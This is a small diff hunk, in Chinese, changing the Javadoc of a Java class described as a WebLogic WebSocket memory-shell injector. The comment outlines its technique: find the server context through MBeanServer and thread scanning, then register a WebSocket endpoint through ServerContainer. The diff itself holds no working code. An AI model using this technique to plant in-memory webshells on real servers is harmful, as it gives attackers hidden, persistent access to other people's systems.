@@ -16,7 +16,7 @@ import java.util.zip.GZIPInputStream;
  * WebLogic WebSocket 内存马注入器。
  * <p>
  * Context 发现逻辑复用 {@link WebLogicFilterInjector}（基于 MBeanServer
- * 和线程 workEntry 扫描），注入逻辑改为通过 ServletContext 获取
+ * 和线程 workEntry 扫描），并通过 ServletContext 获取
  * ServerContainer 并 addEndpoint。
  * <p>
  * WebLogic 12.2.1+ 使用 Tyrus 作为 JSR-356 实现，
